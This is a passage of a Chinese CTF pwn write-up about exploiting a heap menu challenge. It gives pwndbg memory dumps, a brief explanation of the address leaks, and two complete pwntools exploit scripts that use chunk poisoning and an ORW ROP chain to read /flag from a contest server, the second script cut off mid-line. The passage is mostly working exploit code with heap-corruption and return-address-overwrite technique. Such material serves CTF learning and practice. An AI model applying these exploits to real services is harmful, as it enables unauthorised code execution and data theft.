<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">     <span class="number">0x55060000000</span>      <span class="number">0x55064000000</span> rw-p  <span class="number">4000000</span>      <span class="number">0</span> [anon_55060000]</span><br><span class="line">pwndbg&gt; tel <span class="number">0x55060000000</span>+<span class="number">0x160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55060000160</span> —▸ <span class="number">0x7fe7da5a5740</span> ◂— <span class="number">0x7fe7da5a5740</span></span><br></pre></td></tr></table></figure>

<p>然后发现0x7fe7da5a5740偏移+0x300处有一个地址是栈上的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tel <span class="number">0x7fe7da5a5740</span>+<span class="number">0x300</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fe7da5a5a40</span> —▸ <span class="number">0x7fffa5cd7100</span> —▸ <span class="number">0x5642b1dc7950</span> ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fe7da5a5a48</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>所以我们可以利用一步步申请，show泄露地址的方法一直泄露到这个栈地址0x7fffa5cd7100（这里一直申请泄露地址-8处的堆块主要是为了防止add时输入覆盖了要泄露的地址），可以利用这个栈地址+偏移，泄露里libc基地址，然后来覆盖edit返回地址来orw，比赛时似乎有带猪脑过载，下面的payload有点犯傻的饶了圈子来orw，先改了edit返回的ebp为__libc_start_main+243返回地址-8的位置和返回地址为leave ret，然后在__libc_start_main+243处构造了orw，赛后想想其实直接改edit返回地址为orw即可，再仔细想想其实连pie都不用泄露呜呜呜</p>
<h3 id="比赛时猪脑过载的EXP"><a href="#比赛时猪脑过载的EXP" class="headerlink" title="比赛时猪脑过载的EXP"></a>比赛时猪脑过载的EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc_elf=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;123.60.179.52&quot;</span>,<span class="string">&quot;30304&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sa(<span class="string">b&#x27; Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0016B9)&#x27;) #free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl()</span><br><span class="line">base=uu64(r(<span class="number">6</span>))&amp;<span class="number">0xfffff000000</span></span><br><span class="line"><span class="comment"># 0x3755c020461</span></span><br><span class="line"><span class="comment"># 0x3755c 000000</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">1</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">1</span>) <span class="comment">#5 </span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak2=uu64(r(<span class="number">6</span>))</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">p(<span class="string">&#x27;leak2&#x27;</span>,leak2)</span><br><span class="line">p(<span class="string">&#x27;leak3&#x27;</span>,leak3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(leak3-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#11</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;h&quot;</span>*<span class="number">8</span>) <span class="comment">#12</span></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">ru(<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_stack=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;leak_stack&#x27;</span>,leak_stack)</span><br><span class="line">__libc_start_main_243_stack=leak_stack-(<span class="number">0x7ffc8d14f0d0</span>-<span class="number">0x7ffc8d14f0a8</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main_243_stack&#x27;</span>,__libc_start_main_243_stack)</span><br><span class="line"><span class="comment"># 0x1950</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#17</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;i&quot;</span>*<span class="number">8</span>) <span class="comment">#18</span></span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">__libc_start_main=uu64(r(<span class="number">6</span>))-<span class="number">243</span></span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#19</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">20</span>)</span><br><span class="line">edit(<span class="number">20</span>,p64(leak_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#21</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#22</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#23</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;j&quot;</span>*<span class="number">8</span>) <span class="comment">#24</span></span><br><span class="line">show(<span class="number">24</span>)</span><br><span class="line">ru(<span class="string">b&#x27;j&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">pie=uu64(r(<span class="number">6</span>))-<span class="number">0x1950</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">systemcall=base+libc_elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;systemcall&#x27;</span>,systemcall)</span><br><span class="line">write=base+libc_elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=base+libc_elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi=pie+<span class="number">0x00000000000019b3</span></span><br><span class="line">pop_rsi_r15=pie+<span class="number">0x00000000000019b1</span></span><br><span class="line">pop_rdx=base+<span class="number">0x0000000000142c92</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">edit_ret=__libc_start_main_243_stack-<span class="number">0x20</span></span><br><span class="line">p(<span class="string">&#x27;edit_ret&#x27;</span>,edit_ret)</span><br><span class="line">bss=__libc_start_main_243_stack+<span class="number">0x100</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(leak1)+p64(<span class="number">0xdeadbeef</span>)+p64(systemcall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">60</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(write)</span><br><span class="line">edit(<span class="number">18</span>,payload)</span><br><span class="line">leave_ret=<span class="number">0x01840</span>+pie</span><br><span class="line">p(<span class="string">&#x27;leaveret&#x27;</span>,leave_ret)</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#25</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#26</span></span><br><span class="line">dele(<span class="number">25</span>)</span><br><span class="line">dele(<span class="number">26</span>)</span><br><span class="line">edit(<span class="number">26</span>,p64(edit_ret-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#27</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#28</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#29</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#30</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#31</span></span><br><span class="line">ret=pie+<span class="number">0x1841</span></span><br><span class="line"><span class="comment"># edit(31,p64(__libc_start_main_243_stack)+p64(leave_ret))</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">31</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>)+p64(leave_ret))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubantu20 ~/D/s/2/mi&gt; ROPgadget  --binary ./libc.so.6 --only &#x27;pop|ret&#x27; | grep rdx</span></span><br><span class="line"><span class="string">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp"><a href="#赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp" class="headerlink" title="赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp"></a>赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc_elf=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;123.60.179.52&quot;</span>,<span class="string">&quot;30304&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sa(<span class="string">b&#x27; Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0016B9)&#x27;) #free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl()</span><br><span class="line">base=uu64(r(<span class="number">6</span>))&amp;<span class="number">0xfffff000000</span></span><br><span class="line"><span class="comment"># 0x3755c020461</span></span><br><span class="line"><span class="comment"># 0x3755c 000000</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">1</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">1</span>) <span class="comment">#5 </span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak2=uu64(r(<span class="number">6</span>))</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">p(<span class="string">&#x27;leak2&#x27;</span>,leak2)</span><br><span class="line">p(<span class="string">&#x27;leak3&#x27;</span>,leak3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(leak3-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#11</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;h&quot;</span>*<span class="number">8</span>) <span class="comment">#12</span></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">ru(<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_stack=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;leak_stack&#x27;</span>,leak_stack)</span><br><span class="line">__libc_start_main_243_stack=leak_stack-(<span class="number">0x7ffc8d14f0d0</span>-<span class="number">0x7ffc8d14f0a8</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main_243_stack&#x27;</span>,__libc_start_main_243_stack)</span><br><span class="line"><span class="comment"># 0x1950</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#17</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;i&quot;</span>*<span class="number">8</span>) <span class="comment">#18</span></span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">__libc_start_main=uu64(r(<span class="number">6</span>))-<span class="number">243</span></span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">systemcall=base+libc_elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;systemcall&#x27;</span>,systemcall)</span><br><span class="line">write=base+libc_elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=base+libc_elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi=base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_r15=base+<span class="number">0x0000000000023b68</span></span><br><span class="line">pop_rdx=base+<span class="number">0x0000000000142c92</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">edit_ret=__libc_start_main_243_stack-<span class="number">0x20</span></span><br><span class="line">p(<span class="string">&#x27;edit_ret&#x27;</span>,edit_ret)</span><br><span class="line">bss=__libc_start_main_243_stack+<span class="number">0x100</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(leak1)+p64(<span class="number">0xdeadbeef</span>)+p64(systemcall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">60</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#19</span></span><br><span class="line">add(<span 